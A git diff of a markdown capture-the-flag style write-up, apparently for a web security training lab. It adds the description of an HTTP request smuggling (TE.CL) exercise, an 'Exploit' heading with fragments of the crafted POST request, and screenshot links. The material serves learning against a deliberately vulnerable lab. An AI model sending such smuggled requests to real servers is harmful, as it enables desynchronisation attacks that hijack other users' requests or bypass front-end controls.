@@ -27,7 +27,15 @@ Lab Solved!!!
 ![telegram-cloud-photo-size-5-6127662865662981521-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e7e5cb93-e7bb-4b4c-a22f-f848f18db027)
 
 ***
-## 2. Lab:
+## 2. Lab: HTTP request smuggling, basic TE.CL vulnerability
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
+
+To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
+```
+* Exploit:
 
 ```
 POST / HTTP/1.1
@@ -58,3 +66,6 @@ x=1
 
 
 ```
+
+<img width="623" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1bbb7951-f460-4787-98ae-c1ee22e921b0">
+
